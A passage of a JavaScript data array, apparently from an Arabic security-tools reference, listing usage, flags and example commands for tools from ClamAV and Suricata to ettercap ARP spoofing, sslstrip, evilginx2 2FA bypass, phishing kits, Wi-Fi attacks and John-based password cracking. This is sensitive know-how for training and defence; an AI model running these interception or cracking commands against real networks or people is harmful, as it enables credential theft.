    desc: 'مضاد الفيروسات مفتوح المصدر ClamAV لفحص الملفات والمجلدات.',
    options: [
      { flag: '-r', desc: 'فحص تكراري' },
      { flag: '--remove', desc: 'حذف الملفات المصابة' },
      { flag: '-l <log>', desc: 'حفظ السجل' }
    ],
    examples: [
      { cmd: 'clamscan -r /home/', desc: 'فحص مجلد home' },
      { cmd: 'clamscan --remove suspicious_file', desc: 'فحص وحذف' }
    ],
    tips: 'حدّث ClamAV دائماً: freshclam',
    related: ['yara', 'thor-lite', 'rkhunter']
  },
  {
    id: 1471,
    name: 'rkhunter',
    cat: 'forensics',
    level: 'beginner',
    syntax: 'rkhunter [options]',
    short: 'كشف Rootkits على Linux',
    desc: 'أداة للكشف عن rootkits وbackdoors والثغرات المحلية على أنظمة Linux.',
    options: [
      { flag: '--check', desc: 'تشغيل كل الفحوصات' },
      { flag: '--update', desc: 'تحديث قاعدة البيانات' },
      { flag: '--propupd', desc: 'تحديث خصائص الملفات' }
    ],
    examples: [
      { cmd: 'rkhunter --check', desc: 'فحص شامل للنظام' },
      { cmd: 'rkhunter --update', desc: 'تحديث قاعدة البيانات' }
    ],
    tips: 'شغّل rkhunter بعد أي اختراق مشتبه به.',
    related: ['chkrootkit', 'lynis', 'clamav']
  },
  {
    id: 1472,
    name: 'chkrootkit',
    cat: 'forensics',
    level: 'beginner',
    syntax: 'chkrootkit [options]',
    short: 'فحص وجود rootkits شائعة على Linux',
    desc: 'يفحص النظام بحثاً عن rootkits وworms وخيوط LKMs المشبوهة.',
    options: [
      { flag: '-q', desc: 'وضع الهدوء (إظهار التحذيرات فقط)' },
      { flag: '-l', desc: 'سرد الفحوصات المتاحة' }
    ],
    examples: [
      { cmd: 'chkrootkit', desc: 'فحص أساسي' },
      { cmd: 'chkrootkit -q', desc: 'عرض التحذيرات فقط' }
    ],
    tips: 'شغّل chkrootkit من وسيط موثوق لتجنب الـ rootkit من إخفاء نفسه.',
    related: ['rkhunter', 'lynis', 'aide']
  },
  {
    id: 1473,
    name: 'lynis',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'lynis audit system',
    short: 'تدقيق أمني شامل لأنظمة Linux',
    desc: 'أداة تدقيق أمني مفتوحة المصدر تفحص الإعدادات والضعف في أنظمة Unix/Linux.',
    options: [
      { flag: 'audit system', desc: 'تدقيق شامل للنظام' },
      { flag: '--pentest', desc: 'وضع اختبار الاختراق' },
      { flag: '--quick', desc: 'فحص سريع' }
    ],
    examples: [
      { cmd: 'lynis audit system', desc: 'تدقيق كامل' },
      { cmd: 'lynis audit system --pentest', desc: 'تدقيق بوضع اختبار الاختراق' }
    ],
    tips: 'درجة lynis فوق 70 تعني نظام آمن نسبياً.',
    related: ['rkhunter', 'openscap', 'aide']
  },
  {
    id: 1474,
    name: 'aide',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'aide [options]',
    short: 'نظام كشف التعديلات على الملفات',
    desc: 'Advanced Intrusion Detection Environment - يراقب تغييرات الملفات والأدلة على النظام.',
    options: [
      { flag: '--init', desc: 'إنشاء قاعدة بيانات أساسية' },
      { flag: '--check', desc: 'مقارنة مع القاعدة الأساسية' },
      { flag: '--update', desc: 'تحديث القاعدة' }
    ],
    examples: [
      { cmd: 'aide --init', desc: 'إنشاء snapshot أولي' },
      { cmd: 'aide --check', desc: 'فحص التغييرات' }
    ],
    tips: 'احفظ قاعدة بيانات AIDE على وسيط خارجي غير قابل للكتابة.',
    related: ['tripwire', 'rkhunter', 'lynis']
  },
  {
    id: 1475,
    name: 'suricata',
    cat: 'network',
    level: 'advanced',
    syntax: 'suricata -c <config> -i <interface>',
    short: 'نظام IDS/IPS عالي الأداء',
    desc: 'نظام كشف ومنع التسلل مفتوح المصدر عالي الأداء يدعم multi-threading.',
    options: [
      { flag: '-c <config>', desc: 'ملف الإعداد' },
      { flag: '-i <interface>', desc: 'واجهة الشبكة للمراقبة' },
      { flag: '-r <pcap>', desc: 'تحليل ملف PCAP' }
    ],
    examples: [
      { cmd: 'suricata -c /etc/suricata/suricata.yaml -i eth0', desc: 'تشغيل IDS على الشبكة' },
      { cmd: 'suricata -r capture.pcap', desc: 'تحليل ملف PCAP' }
    ],
    tips: 'حدّث rules بـ suricata-update لأحدث التوقيعات.',
    related: ['snort', 'zeek', 'wireshark']
  },
  {
    id: 1476,
    name: 'zeek',
    cat: 'forensics',
    level: 'advanced',
    syntax: 'zeek -i <interface>',
    short: 'تحليل حركة الشبكة وتسجيلها',
    desc: 'إطار تحليل شبكي قوي يولد logs تفصيلية عن حركة الشبكة.',
    options: [
      { flag: '-i <interface>', desc: 'واجهة الشبكة' },
      { flag: '-r <pcap>', desc: 'تحليل ملف PCAP' },
      { flag: '-C', desc: 'تجاهل checksum' }
    ],
    examples: [
      { cmd: 'zeek -i eth0', desc: 'تحليل حركة الشبكة المباشرة' },
      { cmd: 'zeek -r traffic.pcap', desc: 'تحليل ملف pcap' }
    ],
    tips: 'سجلات Zeek قيمة جداً في تحليل الحوادث الأمنية.',
    related: ['suricata', 'tcpdump', 'wireshark']
  },
  {
    id: 1477,
    name: 'snort',
    cat: 'network',
    level: 'advanced',
    syntax: 'snort -c <config> -i <interface>',
    short: 'نظام IDS/IPS الكلاسيكي',
    desc: 'نظام الكشف عن التسلل الأول والأكثر انتشاراً مفتوح المصدر.',
    options: [
      { flag: '-c <config>', desc: 'ملف الإعداد' },
      { flag: '-i <interface>', desc: 'واجهة الشبكة' },
      { flag: '-A <mode>', desc: 'وضع التنبيه' }
    ],
    examples: [
      { cmd: 'snort -c /etc/snort/snort.conf -i eth0', desc: 'تشغيل IDS' }
    ],
    tips: 'Snort وSuricata متوافقان في قواعد Snort.',
    related: ['suricata', 'zeek', 'tcpdump']
  },
  {
    id: 1478,
    name: 'ettercap',
    cat: 'network',
    level: 'intermediate',
    syntax: 'ettercap [options]',
    short: 'هجوم Man-in-the-Middle متكامل',
    desc: 'إطار متكامل لهجمات Man-in-the-Middle يدعم ARP poisoning وDNS spoofing وغيرها.',
    options: [
      { flag: '-T', desc: 'وضع النص' },
      { flag: '-q', desc: 'وضع الصمت' },
      { flag: '-i <interface>', desc: 'واجهة الشبكة' },
      { flag: '-M arp', desc: 'هجوم ARP' }
    ],
    examples: [
      { cmd: 'ettercap -T -q -i eth0 -M arp /192.168.1.1// /192.168.1.100//', desc: 'ARP MitM' }
    ],
    tips: 'استخدم ettercap مع sslstrip لاعتراض HTTPS.',
    related: ['bettercap', 'arpspoof', 'mitmproxy']
  },
  {
    id: 1479,
    name: 'bettercap',
    cat: 'network',
    level: 'intermediate',
    syntax: 'bettercap [options]',
    short: 'إطار MitM الحديث والمتكامل',
    desc: 'بديل حديث لـ ettercap مع واجهة ويب وميزات متقدمة لهجمات الشبكة.',
    options: [
      { flag: '-iface <interface>', desc: 'واجهة الشبكة' },
      { flag: '-caplet <file>', desc: 'تشغيل سكريبت caplet' }
    ],
    examples: [
      { cmd: 'bettercap -iface eth0', desc: 'تشغيل bettercap' },
      { cmd: 'bettercap -iface eth0 -caplet https-ui', desc: 'تشغيل مع واجهة ويب' }
    ],
    tips: 'استخدم caplets الجاهزة مثل pita.cap للهجمات الشاملة.',
    related: ['ettercap', 'mitmproxy', 'arpspoof']
  },
  {
    id: 1480,
    name: 'mitmproxy',
    cat: 'web',
    level: 'intermediate',
    syntax: 'mitmproxy [options]',
    short: 'proxy HTTP تفاعلي للاعتراض والتعديل',
    desc: 'proxy HTTP/HTTPS قابل للبرمجة يتيح اعتراض وتعديل الحركة في الوقت الفعلي.',
    options: [
      { flag: '-p <port>', desc: 'منفذ الاستماع' },
      { flag: '-w <file>', desc: 'تسجيل حركة المرور' },
      { flag: '--ssl-insecure', desc: 'تجاهل تحقق SSL' }
    ],
    examples: [
      { cmd: 'mitmproxy -p 8080', desc: 'تشغيل proxy تفاعلي' },
      { cmd: 'mitmdump -p 8080 -w traffic.log', desc: 'تسجيل الحركة' }
    ],
    tips: 'mitmproxy يدعم Python scripts لمعالجة الحركة برمجياً.',
    related: ['burpsuite', 'bettercap', 'zaproxy']
  },
  {
    id: 1481,
    name: 'sslstrip',
    cat: 'network',
    level: 'advanced',
    syntax: 'sslstrip [options]',
    short: 'تحويل HTTPS إلى HTTP (SSL Stripping)',
    desc: 'يعترض ويحول اتصالات HTTPS إلى HTTP لاعتراض البيانات في النص الواضح.',
    options: [
      { flag: '-l <port>', desc: 'منفذ الاستماع' },
      { flag: '-k', desc: 'تثبيت iptables rules' }
    ],
    examples: [
      { cmd: 'sslstrip -l 8080', desc: 'تشغيل sslstrip' }
    ],
    tips: 'HSTS يمنع sslstrip من العمل على المواقع الحديثة.',
    related: ['bettercap', 'ettercap', 'mitmproxy']
  },
  {
    id: 1482,
    name: 'evilginx2',
    cat: 'social-engineering',
    level: 'advanced',
    syntax: 'evilginx2',
    short: 'اعتراض جلسات تسجيل الدخول وتجاوز 2FA',
    desc: 'إطار reverse proxy متقدم لاعتراض بيانات الاعتماد وملفات الجلسة وتجاوز المصادقة الثنائية.',
    options: [],
    examples: [
      { cmd: 'evilginx2', desc: 'تشغيل evilginx2' }
    ],
    tips: 'evilginx2 يتجاوز 2FA بجمع session cookies مباشرة.',
    related: ['gophish', 'modlishka', 'social-engineer-toolkit']
  },
  {
    id: 1483,
    name: 'gophish',
    cat: 'social-engineering',
    level: 'intermediate',
    syntax: 'gophish',
    short: 'إطار هندسة اجتماعية وتصيد احترافي',
    desc: 'منصة مفتوحة المصدر لإنشاء وإدارة حملات phishing بشكل احترافي.',
    options: [],
    examples: [
      { cmd: 'gophish', desc: 'تشغيل خادم GoPhish' }
    ],
    tips: 'GoPhish يتتبع من فتح الرسائل ومن أدخل بيانات الاعتماد.',
    related: ['social-engineer-toolkit', 'evilginx2', 'modlishka']
  },
  {
    id: 1484,
    name: 'social-engineer-toolkit',
    cat: 'social-engineering',
    level: 'intermediate',
    syntax: 'setoolkit',
    short: 'إطار الهندسة الاجتماعية الشامل (SET)',
    desc: 'إطار الهندسة الاجتماعية من TrustedSec يدعم spear phishing وwebsite cloning وكثيراً.',
    options: [],
    examples: [
      { cmd: 'setoolkit', desc: 'تشغيل SET' }
    ],
    tips: 'SET Site Cloner يُنشئ نسخة طبق الأصل من أي موقع.',
    related: ['gophish', 'evilginx2', 'beef']
  },
  {
    id: 1485,
    name: 'beef',
    cat: 'social-engineering',
    level: 'advanced',
    syntax: 'beef-xss',
    short: 'إطار استغلال متصفحات الويب',
    desc: 'Browser Exploitation Framework يستغل ثغرات XSS لإدارة المتصفحات المخترقة.',
    options: [],
    examples: [
      { cmd: 'beef-xss', desc: 'تشغيل BeEF' },
      { cmd: 'http://localhost:3000/ui/panel', desc: 'واجهة الإدارة' }
    ],
    tips: 'BeEF يكشف معلومات المتصفح والشبكة المحلية للضحية.',
    related: ['social-engineer-toolkit', 'burpsuite', 'xsser']
  },
  {
    id: 1486,
    name: 'nginx',
    cat: 'system',
    level: 'beginner',
    syntax: 'nginx [options]',
    short: 'خادم ويب ومحول طلبات عالي الأداء',
    desc: 'خادم ويب Nginx شائع الاستخدام كـ web server وreverse proxy وload balancer.',
    options: [
      { flag: '-t', desc: 'اختبار ملف الإعداد' },
      { flag: '-s reload', desc: 'إعادة تحميل الإعداد' },
      { flag: '-s stop', desc: 'إيقاف Nginx' }
    ],
    examples: [
      { cmd: 'nginx -t', desc: 'اختبار صحة الإعداد' },
      { cmd: 'systemctl start nginx', desc: 'تشغيل Nginx' }
    ],
    tips: 'Nginx أكثر كفاءة من Apache في التعامل مع الاتصالات المتزامنة.',
    related: ['apache2', 'caddy', 'iptables']
  },
  {
    id: 1487,
    name: 'apache2',
    cat: 'system',
    level: 'beginner',
    syntax: 'apache2 [options] | apachectl [options]',
    short: 'خادم ويب Apache الشهير',
    desc: 'خادم ويب Apache أحد أكثر خوادم الويب استخداماً في العالم.',
    options: [
      { flag: '-t', desc: 'اختبار الإعداد' },
      { flag: 'configtest', desc: 'اختبار الإعداد بـ apachectl' }
    ],
    examples: [
      { cmd: 'systemctl start apache2', desc: 'تشغيل Apache' },
      { cmd: 'apachectl configtest', desc: 'اختبار الإعداد' }
    ],
    tips: 'ملفات الإعداد في /etc/apache2/sites-available/',
    related: ['nginx', 'caddy', 'php']
  },
  {
    id: 1488,
    name: 'ufw',
    cat: 'system',
    level: 'beginner',
    syntax: 'ufw [options]',
    short: 'جدار حماية Ubuntu البسيط',
    desc: 'Uncomplicated Firewall - واجهة مبسطة لإدارة iptables على Ubuntu.',
    options: [
      { flag: 'enable', desc: 'تفعيل جدار الحماية' },
      { flag: 'disable', desc: 'تعطيل جدار الحماية' },
      { flag: 'allow <port>', desc: 'السماح بمنفذ' },
      { flag: 'deny <port>', desc: 'حظر منفذ' },
      { flag: 'status', desc: 'عرض الحالة' }
    ],
    examples: [
      { cmd: 'ufw allow 22/tcp', desc: 'السماح بـ SSH' },
      { cmd: 'ufw deny 3306', desc: 'حظر MySQL من الخارج' },
      { cmd: 'ufw status verbose', desc: 'عرض القواعد التفصيلية' }
    ],
    tips: 'ufw logging on لتسجيل محاولات الاتصال المحظورة.',
    related: ['iptables', 'firewalld', 'nftables']
  },
  {
    id: 1489,
    name: 'firewalld',
    cat: 'system',
    level: 'beginner',
    syntax: 'firewall-cmd [options]',
    short: 'جدار حماية ديناميكي لـ Linux',
    desc: 'إدارة ديناميكية لجدار الحماية على أنظمة RHEL/CentOS/Fedora.',
    options: [
      { flag: '--add-port=<port>/tcp', desc: 'فتح منفذ' },
      { flag: '--remove-port=<port>/tcp', desc: 'إغلاق منفذ' },
      { flag: '--permanent', desc: 'جعل القاعدة دائمة' },
      { flag: '--reload', desc: 'إعادة تحميل الإعداد' }
    ],
    examples: [
      { cmd: 'firewall-cmd --add-port=80/tcp --permanent', desc: 'فتح HTTP بشكل دائم' },
      { cmd: 'firewall-cmd --reload', desc: 'تطبيق التغييرات' }
    ],
    tips: 'استخدم --runtime-to-permanent لتطبيق الإعدادات الحالية بشكل دائم.',
    related: ['ufw', 'iptables', 'nftables']
  },
  {
    id: 1490,
    name: 'fail2ban',
    cat: 'system',
    level: 'beginner',
    syntax: 'fail2ban-client [options]',
    short: 'حماية من هجمات Brute Force',
    desc: 'يراقب سجلات النظام ويحظر IPs التي تنفذ هجمات brute force.',
    options: [
      { flag: 'status', desc: 'عرض حالة الـ jails' },
      { flag: 'status <jail>', desc: 'حالة jail محدد' },
      { flag: 'set <jail> unbanip <ip>', desc: 'فك حظر IP' }
    ],
    examples: [
      { cmd: 'fail2ban-client status', desc: 'عرض كل الـ jails النشطة' },
      { cmd: 'fail2ban-client status sshd', desc: 'حالة SSH jail' }
    ],
    tips: 'اضبط maxretry=3 وbantime=3600 للحماية الجيدة.',
    related: ['ufw', 'iptables', 'sshd']
  },
  {
    id: 1491,
    name: 'ansible',
    cat: 'system',
    level: 'intermediate',
    syntax: 'ansible [hosts] -m <module> [options]',
    short: 'أتمتة إعداد الأنظمة عن بُعد',
    desc: 'أداة DevOps لأتمتة إدارة الأنظمة والتوزيع بدون agents.',
    options: [
      { flag: '-i <inventory>', desc: 'ملف inventory الأجهزة' },
      { flag: '-m <module>', desc: 'الوحدة المستخدمة' },
      { flag: '-a <args>', desc: 'مقاطعات الوحدة' },
      { flag: '--ask-pass', desc: 'طلب كلمة مرور SSH' }
    ],
    examples: [
      { cmd: 'ansible all -i hosts.ini -m ping', desc: 'فحص الاتصال بكل الأجهزة' },
      { cmd: 'ansible all -m command -a "whoami"', desc: 'تنفيذ أمر على كل الأجهزة' }
    ],
    tips: 'ansible-playbook لتنفيذ سيناريوهات إعداد معقدة.',
    related: ['salt', 'puppet', 'terraform']
  },
  {
    id: 1492,
    name: 'docker-compose',
    cat: 'system',
    level: 'intermediate',
    syntax: 'docker-compose [options] <command>',
    short: 'إدارة تطبيقات Docker متعددة الحاويات',
    desc: 'تعريف وتشغيل تطبيقات Docker متعددة الحاويات باستخدام ملف YAML.',
    options: [
      { flag: 'up', desc: 'تشغيل كل الخدمات' },
      { flag: 'down', desc: 'إيقاف وحذف الحاويات' },
      { flag: 'ps', desc: 'عرض حالة الخدمات' },
      { flag: '-d', desc: 'تشغيل في الخلفية' }
    ],
    examples: [
      { cmd: 'docker-compose up -d', desc: 'تشغيل كل الخدمات في الخلفية' },
      { cmd: 'docker-compose down', desc: 'إيقاف كل الخدمات' }
    ],
    tips: 'استخدم docker-compose لإعداد بيئات اختبار lab بسرعة.',
    related: ['docker', 'kubernetes', 'vagrant']
  },
  {
    id: 1493,
    name: 'vagrant',
    cat: 'system',
    level: 'intermediate',
    syntax: 'vagrant [command]',
    short: 'إنشاء وإدارة بيئات افتراضية',
    desc: 'أداة لأتمتة إنشاء وإعداد الأجهزة الافتراضية للتطوير والاختبار.',
    options: [
      { flag: 'up', desc: 'تشغيل وإنشاء الجهاز الافتراضي' },
      { flag: 'halt', desc: 'إيقاف الجهاز' },
      { flag: 'ssh', desc: 'الاتصال بالجهاز عبر SSH' },
      { flag: 'destroy', desc: 'حذف الجهاز' }
    ],
    examples: [
      { cmd: 'vagrant init ubuntu/focal64', desc: 'تهيئة Vagrantfile' },
      { cmd: 'vagrant up', desc: 'تشغيل الجهاز الافتراضي' }
    ],
    tips: 'استخدم vagrant مع VirtualBox لإنشاء مختبرات الأمن.',
    related: ['docker', 'virtualbox', 'packer']
  },
  {
    id: 1494,
    name: 'proxmark3',
    cat: 'wireless',
    level: 'advanced',
    syntax: 'proxmark3 /dev/ttyACM0',
    short: 'اختبار أمان بطاقات RFID/NFC',
    desc: 'أداة لقراءة وكتابة وتحليل بطاقات RFID و NFC.',
    options: [],
    examples: [
      { cmd: 'proxmark3 /dev/ttyACM0', desc: 'الاتصال بجهاز Proxmark3' }
    ],
    tips: 'استخدم hf mf chk للبحث عن مفاتيح MIFARE الضعيفة.',
    related: ['nfc-tools', 'libnfc', 'flipper-zero']
  },
  {
    id: 1495,
    name: 'bluez',
    cat: 'wireless',
    level: 'intermediate',
    syntax: 'bluetoothctl',
    short: 'إدارة وفحص أجهزة Bluetooth',
    desc: 'حزمة بروتوكولات Bluetooth لـ Linux تتيح المسح والاتصال وإدارة الأجهزة.',
    options: [],
    examples: [
      { cmd: 'bluetoothctl scan on', desc: 'البحث عن أجهزة Bluetooth' },
      { cmd: 'btlejuice', desc: 'اعتراض BLE' }
    ],
    tips: 'استخدم hcitool lescan لاكتشاف أجهزة BLE.',
    related: ['bettercap', 'ubertooth', 'btlejack']
  },
  {
    id: 1496,
    name: 'wifite',
    cat: 'wireless',
    level: 'intermediate',
    syntax: 'wifite [options]',
    short: 'أتمتة هجمات Wi-Fi',
    desc: 'أداة تلقائية لاختبار أمان الشبكات اللاسلكية تجمع عدة هجمات Wi-Fi.',
    options: [
      { flag: '--wep', desc: 'استهداف شبكات WEP فقط' },
      { flag: '--wpa', desc: 'استهداف شبكات WPA/WPA2' },
      { flag: '--dict <file>', desc: 'قاموس كلمات المرور' }
    ],
    examples: [
      { cmd: 'wifite', desc: 'مسح وهجوم تلقائي' },
      { cmd: 'wifite --wpa --dict rockyou.txt', desc: 'استهداف WPA بقاموس' }
    ],
    tips: 'wifite2 النسخة المحدثة أكثر استقراراً وفاعلية.',
    related: ['aircrack-ng', 'hashcat', 'hcxtools']
  },
  {
    id: 1497,
    name: 'hcxtools',
    cat: 'wireless',
    level: 'advanced',
    syntax: 'hcxdumptool -i <interface> -o <output>',
    short: 'استخراج هاشات Wi-Fi WPA/WPA2',
    desc: 'مجموعة أدوات لاستخراج هاشات WPA/WPA2 PMKID و MIC لكسرها لاحقاً.',
    options: [],
    examples: [
      { cmd: 'hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1', desc: 'التقاط PMKID' },
      { cmd: 'hcxpcapngtool -o hash.22000 capture.pcapng', desc: 'تحويل للصيغة المناسبة لـ hashcat' }
    ],
    tips: 'استخدم hashcat -m 22000 لكسر WPA3 PMKID.',
    related: ['aircrack-ng', 'hashcat', 'wifite']
  },
  {
    id: 1498,
    name: 'gps-sdr-sim',
    cat: 'wireless',
    level: 'advanced',
    syntax: 'gps-sdr-sim [options]',
    short: 'محاكاة إشارات GPS',
    desc: 'برنامج لمحاكاة إشارات GPS باستخدام أجهزة SDR لأغراض البحثية.',
    options: [],
    examples: [
      { cmd: 'gps-sdr-sim -e brdc*.n -l 37.7749,-122.4194,100', desc: 'محاكاة إشارة GPS' }
    ],
    tips: 'للأبحاث فقط - انتبه للقوانين المحلية المتعلقة بإرسال إشارات GPS.',
    related: ['hackrf', 'gnuradio', 'rtl-sdr']
  },
  {
    id: 1499,
    name: 'hackrf',
    cat: 'wireless',
    level: 'advanced',
    syntax: 'hackrf_info',
    short: 'أداة SDR لاعتراض الإشارات اللاسلكية',
    desc: 'واجهة لاستخدام جهاز HackRF One للعمل مع طيف الراديو.',
    options: [],
    examples: [
      { cmd: 'hackrf_info', desc: 'معلومات جهاز HackRF' },
      { cmd: 'hackrf_transfer -r output.bin -f 433920000 -s 2000000', desc: 'استقبال إشارة 433MHz' }
    ],
    tips: 'HackRF يدعم 1MHz إلى 6GHz - مثالي لتحليل IoT.',
    related: ['gnuradio', 'rtl-sdr', 'gps-sdr-sim']
  },
  {
    id: 1500,
    name: 'gnuradio',
    cat: 'wireless',
    level: 'advanced',
    syntax: 'gnuradio-companion',
    short: 'إطار تطوير SDR بصري',
    desc: 'GNU Radio هو إطار تطوير مفتوح المصدر لتطبيقات SDR مع واجهة تصميم بصرية.',
    options: [],
    examples: [
      { cmd: 'gnuradio-companion', desc: 'فتح واجهة GNU Radio' }
    ],
    tips: 'استخدم OsmoSDR source block للتكامل مع HackRF وRTL-SDR.',
    related: ['hackrf', 'rtl-sdr', 'gps-sdr-sim']
  },
  {
    id: 1501,
    name: 'rtl-sdr',
    cat: 'wireless',
    level: 'intermediate',
    syntax: 'rtl_sdr [options]',
    short: 'استقبال إشارات راديو بـ RTL-SDR',
    desc: 'مجموعة أدوات لاستخدام dongle RTL-SDR الرخيص لاستقبال إشارات الراديو.',
    options: [
      { flag: '-f <freq>', desc: 'التردد بالهرتز' },
      { flag: '-s <rate>', desc: 'معدل الأخذ' },
      { flag: '-n <samples>', desc: 'عدد العينات' }
    ],
    examples: [
      { cmd: 'rtl_test', desc: 'اختبار جهاز RTL-SDR' },
      { cmd: 'rtl_sdr -f 433920000 -s 250000 output.bin', desc: 'استقبال 433MHz' }
    ],
    tips: 'RTL-SDR يُستخدم لاستقبال بيانات ADS-B لتتبع الطائرات.',
    related: ['gnuradio', 'hackrf', 'gqrx']
  },
  {
    id: 1502,
    name: 'angr',
    cat: 'reverse-engineering',
    level: 'advanced',
    syntax: 'python3 -c "import angr"',
    short: 'تحليل ثنائي رمزي بـ Python',
    desc: 'إطار Python للتحليل الرمزي للملفات الثنائية وإيجاد المسارات والثغرات تلقائياً.',
    options: [],
    examples: [
      { cmd: 'python3 solve.py', desc: 'تشغيل سكريبت angr' }
    ],
    tips: 'angr مثالي لحل CTF binary challenges بشكل آلي.',
    related: ['radare2', 'gdb-pwndbg', 'pwntools']
  },
  {
    id: 1503,
    name: 'sage',
    cat: 'crypto',
    level: 'advanced',
    syntax: 'sage',
    short: 'نظام رياضيات لحل تحديات التشفير',
    desc: 'SageMath منظومة رياضية مفتوحة تُستخدم في حل تحديات التشفير الرياضية في CTF.',
    options: [],
    examples: [
      { cmd: 'sage', desc: 'فتح REPL لـ SageMath' },
      { cmd: 'sage solve.sage', desc: 'تشغيل سكريبت Sage' }
    ],
    tips: 'sage ضروري لتحديات RSA وECC في CTF.',
    related: ['python', 'pycryptodome', 'sympy']
  },
  {
    id: 1504,
    name: 'pycryptodome',
    cat: 'crypto',
    level: 'intermediate',
    syntax: 'from Crypto.Cipher import AES',
    short: 'مكتبة Python للتشفير',
    desc: 'مكتبة Python شاملة تدعم خوارزميات تشفير متعددة مثل AES, RSA, DES.',
    options: [],
    examples: [
      { cmd: 'pip install pycryptodome', desc: 'تثبيت المكتبة' },
      { cmd: 'from Crypto.Util.number import getPrime', desc: 'توليد أعداد أولية' }
    ],
    tips: 'pycryptodome ضروري لتحليل وكسر أنظمة التشفير في CTF.',
    related: ['sage', 'openssl', 'python']
  },
  {
    id: 1505,
    name: 'john-jumbo',
    cat: 'password',
    level: 'intermediate',
    syntax: 'john [options] <hashfile>',
    short: 'نسخة John the Ripper المحسّنة',
    desc: 'نسخة Jumbo من John the Ripper تدعم صيغ هاش إضافية وخوارزميات أحدث.',
    options: [
      { flag: '--format=bcrypt', desc: 'كسر bcrypt' },
      { flag: '--rules=KoreLogic', desc: 'قواعد KoreLogic الشاملة' }
    ],
    examples: [
      { cmd: 'john --format=bcrypt --wordlist=rockyou.txt hashes.txt', desc: 'كسر bcrypt' },
      { cmd: 'john --format=jwt hashes.txt', desc: 'كسر JWT secrets' }
    ],
    tips: 'john-jumbo يدعم أكثر من 100 صيغة هاش.',
    related: ['hashcat', 'john', 'hash-identifier']
  },
  {
    id: 1506,
    name: 'zip2john',
    cat: 'password',
    level: 'beginner',
    syntax: 'zip2john <zipfile> > hash.txt',
    short: 'استخراج هاش كلمة مرور ZIP لكسرها',
    desc: 'يستخرج هاش كلمة مرور ملف ZIP بصيغة قابلة لكسرها بـ John the Ripper.',
    options: [],
    examples: [
      { cmd: 'zip2john secret.zip > zip_hash.txt', desc: 'استخراج الهاش' },
      { cmd: 'john --wordlist=rockyou.txt zip_hash.txt', desc: 'كسر الهاش' }
    ],
    tips: 'نفس المنهج يعمل مع rar2john وpdf2john.',
    related: ['john', 'fcrackzip', 'hashcat']
  },
  {
    id: 1507,
    name: 'pdf2john',
    cat: 'password',
    level: 'beginner',
    syntax: 'pdf2john <pdffile> > hash.txt',
    short: 'استخراج هاش كلمة مرور PDF لكسرها',
    desc: 'يستخرج هاش كلمة مرور ملف PDF لكسره بـ John the Ripper.',
    options: [],
    examples: [
      { cmd: 'pdf2john protected.pdf > pdf_hash.txt', desc: 'استخراج الهاش' },
      { cmd: 'john --wordlist=rockyou.txt pdf_hash.txt', desc: 'كسر الهاش' }
    ],
    tips: 'يعمل مع john-jumbo الذي يدعم أنواع تشفير PDF الحديثة.',
    related: ['john', 'john-jumbo', 'hashcat']
  },
  {
    id: 1508,
    name: 'keepass2john',
    cat: 'password',
    level: 'intermediate',
    syntax: 'keepass2john <database.kdbx> > hash.txt',
    short: 'استخراج هاش قاعدة بيانات KeePass',
    desc: 'يستخرج هاش ملف قاعدة بيانات KeePass لكسر كلمة المرور الرئيسية.',
    options: [],
    examples: [
      { cmd: 'keepass2john database.kdbx > keepass_hash.txt', desc: 'استخراج الهاش' },
      { cmd: 'john --wordlist=rockyou.txt keepass_hash.txt', desc: 'كسر الهاش' }
    ],
    tips: 'قواعد KeePass مشفرة بـ AES256 - الكسر بطيء جداً.',
    related: ['john', 'hashcat', 'keepassxc']
  },
  {
    id: 1509,
    name: 'ssh2john',
    cat: 'password',
    level: 'intermediate',
    syntax: 'ssh2john <private_key> > hash.txt',
    short: 'استخراج هاش مفتاح SSH الخاص المحمي',
    desc: 'يستخرج هاش passphrase مفتاح SSH الخاص المشفر لكسره.',
    options: [],
    examples: [
      { cmd: 'ssh2john id_rsa > ssh_hash.txt', desc: 'استخراج الهاش' },
      { cmd: 'john --wordlist=rockyou.txt ssh_hash.txt', desc: 'كسر الـ passphrase' }
    ],
    tips: 'في CTF، مفاتيح SSH المحمية بكلمة مرور قصيرة تُكسر بسهولة.',
    related: ['john', 'hashcat', 'ssh']
  },
  {
    id: 1510,
    name: 'gpg',
    cat: 'crypto',
    level: 'beginner',
    syntax: 'gpg [options]',
    short: 'تشفير وفك تشفير الملفات وإدارة المفاتيح',
    desc: 'GNU Privacy Guard لتشفير وتوقيع الملفات والرسائل باستخدام تشفير غير متماثل.',
    options: [
      { flag: '-e -r <recipient>', desc: 'تشفير لمستلم معين' },
      { flag: '-d', desc: 'فك التشفير' },
      { flag: '--gen-key', desc: 'توليد زوج مفاتيح' },
      { flag: '--list-keys', desc: 'سرد المفاتيح' }
    ],
    examples: [
      { cmd: 'gpg --gen-key', desc: 'توليد زوج مفاتيح' },
      { cmd: 'gpg -e -r "recipient@email.com" file.txt', desc: 'تشفير ملف' },
      { cmd: 'gpg -d file.txt.gpg', desc: 'فك تشفير ملف' }
    ],
    tips: 'GPG يُستخدم في CTF لفك تشفير رسائل مشفرة أو كسر passphrases.',
    related: ['openssl', 'sage', 'pycryptodome']
  }
];
